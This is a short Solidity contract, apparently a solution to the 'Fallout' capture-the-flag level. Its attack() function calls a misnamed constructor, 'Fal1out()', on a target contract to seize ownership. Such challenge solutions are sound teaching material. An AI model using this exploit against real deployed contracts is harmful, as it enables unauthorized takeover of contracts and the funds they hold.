pragma solidity ^0.6.0;

contract FalloutAttacker {
    address public target;

    constructor(address _target) public {
        target = _target;
    }

    function attack() public {
        (bool success,) = target.call(abi.encodeWithSignature("Fal1out()"));
        require(success, "Attack failed");
    }
} 